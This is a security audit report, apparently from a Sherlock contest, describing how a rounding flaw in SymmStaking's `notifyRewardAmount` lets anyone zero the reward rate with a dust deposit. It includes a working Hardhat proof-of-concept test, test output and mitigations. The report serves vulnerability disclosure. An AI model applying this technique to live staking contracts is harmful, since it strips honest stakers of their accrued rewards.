# [H-1] Attacker can break rewards distribution and calculation by calling `notifyRewardAmount` with dust amount

### Summary

In the `SymmStaking` contract, any call to the [notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275) function resets the reward accrual state for a given reward token. This reset overwrites previously accrued rewards and recalculates the reward rate over a fresh period. An attacker can exploit this logic by calling the function with a tiny reward amount, effectively breaking the rewards distribution mechanism.

The vulnerability is in the internal function [_addRewardsForToken](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L374), which is invoked by `notifyRewardAmount` function.

```javascript
function _addRewardsForToken(address token, uint256 amount) internal {
	TokenRewardState storage state = rewardState[token];

	if (block.timestamp >= state.periodFinish) {
		state.rate = amount / state.duration;
	} else {
		uint256 remaining = state.periodFinish - block.timestamp;
		uint256 leftover = remaining * state.rate;
//@audit if new rewards are added during the current period, but the `amount+leftover < duration`, the rate will round to 0.
		state.rate = (amount + leftover) / state.duration;
	}

	state.lastUpdated = block.timestamp;
	state.periodFinish = block.timestamp + state.duration;
}
```

Let's look at a numerical example.
Initial state

```javascript
state.rate = 604800 / 604800; // = 1 token per second.
state.lastUpdated = block.timestamp;
state.periodFinish = block.timestamp + 604800; // 1 week later.
```

At this point, if a user calls `claimRewards` after 1 day (86,400 one day in seconds) they will get 86,400 tokens in return.
Imagine that after 1 day, another user calls the `notifyRewardAmount` function and adds 30.000 tokens as additional rewards.
The new rate will be computed like this

```javascript
uint256 remaining = state.periodFinish - block.timestamp; // remaining = 518400 (1 week - 1 day in seconds)
uint256 leftover = remaining * state.rate; // leftover = 518400 * 1 = 518400
state.rate = (amount + leftover) / state.duration; // new rate is zero due to integer division
//30.000 (amount to be added as rewards) + 518400 (leftover rewards) / 604800 (initial duration)
//@audit new rate will be 0.906 which will be rounded down to zero
```


### Root Cause

The main issue lies in the internal function `_addRewardsForToken`, which is invoked by `notifyRewardAmount`.
If an attacker or any honest user attempts to add extra rewards, but the amount of tokens that they add plus the leftover rewards does not exceed DEFAULT_REWARDS_DURATION which is 604800, then the `TokenRewardState::rate` will be rounded to zero.

This is wrong because `DEFAULT_REWARDS_DURATION` is meant to represent a duration expressed in seconds and not an actual number of tokens. If the reward token is for example `USDC` or `WETH`, after two days (172800 seconds), a user must add `172801` `USDC` or `WETH` as rewards in order for the `rate` calculation to not be rounded down to zero. In a real-world example, this is not feasible due to the actual monetary value of tokens.

```javascript
	function _addRewardsForToken(address token, uint256 amount) internal {
//..
//.. @audit `state.rate` gets rounded to zero if amount + leftover does not exceed `state.duration`
			state.rate = (amount + leftover) / state.duration;
		}
//..
	}
```

### Internal Pre-conditions

None, this will happen under normal usage of the protocol, even if honest users try to add rewards.

### External Pre-conditions

None

### Attack Path

After the initial setup, some user calls the `notifyRewardAmount` in an attempt to add more rewards to the contract.

### Impact

- Loss of funds for users
A malicious actor can exploit this flaw by calling `notifyRewardAmount` with a negligible amount (e.g., 1 wei). This resets the reward accrual state and reduces the reward rate to 0, causing honest stakers to lose the rewards they have accumulated.

### PoC

Put this test into the `symmStaking.behavior.ts` file

```javascript
it.only("should break rewards", async function () {
	// Scenario: Single depositor — user1 deposits 604,800 SYMM, waits 1 day, claims 86400 tokens.

	const depositAmount = "604800"
	const rewardAmount = depositAmount
	await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
	await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
	await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount])

	//User 1 deposits and claims rewards for a full day
	await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
	await symmStaking.connect(user1).deposit(depositAmount, user1.address)

	await time.increase(86400)

	const user1BalanceBefore = await stakingToken.balanceOf(user1.address)
	await symmStaking.connect(user1).claimRewards()
	const user1BalanceAfter = await stakingToken.balanceOf(user1.address)
	const claimed = user1BalanceAfter - user1BalanceBefore
	console.log("Claimed amount is:", claimed.toString())

	expect(claimed).to.equal("86400")

	//User 2 breaks rewards calculation by depositing some extra rewards
	const tinyAmount = "10000"
	await stakingToken.connect(user2).approve(await symmStaking.getAddress(), tinyAmount)
	await symmStaking.connect(user2).notifyRewardAmount([await stakingToken.getAddress()], [tinyAmount])

	//fast forward time 1 week
	await time.increase(604800)

	//prove that rewards calculations are broken
	const user1BalanceBefore2ndClaim = await stakingToken.balanceOf(user1.address)
	await symmStaking.connect(user1).claimRewards()
	const user1BalanceAfter2ndClaim = await stakingToken.balanceOf(user1.address)
	const claimed2nd = user1BalanceAfter2ndClaim - user1BalanceBefore2ndClaim
	console.log("Claimed amount User1 is:", claimed2nd.toString())

	const user2BalanceBeforeClaim = await stakingToken.balanceOf(user2.address)
	await symmStaking.connect(user2).claimRewards()
	const user2BalanceAfterClaim = await stakingToken.balanceOf(user2.address)
	const claimedUser2 = user2BalanceAfterClaim - user2BalanceBeforeClaim
	console.log("Claimed amount User2 is:", claimedUser2.toString())
})
```

Test output

```javascript
SymmVesting Contract deployed at: 0x15BB2cc3Ea43ab2658F7AaecEb78A9d3769BE3cb
deploy:SymmStaking
SymmStaking Contract deployed at: 0xAE246E208ea35B3F23dE72b697D47044FC594D5F
Claimed amount is: 86400
Claimed amount User1 is: 1
Claimed amount User2 is: 0
          ✔ should break rewards
```

The test clearly shows that after calling the `notifyRewardAmount` function and adding extra rewards, User1 got only 1 token after a full week, and User2 got 0.

### Mitigation

Depending on the desired design of the protocol, some options are:

- Add access controls and only allow a trusted admin to add new rewards.
- Enforce a minimum reward amount requirement. Reject transactions where the amount would make the rate round down to zero.
- Change the logic in a way that preserves previously accrued rewards when new rewards are added. For instance, conditionally update `state.lastUpdated` and `state.periodFinish` only if the amount exceeds a minimum threshold, but this will probably introduce the need to change the code in some other parts and may not be desired.
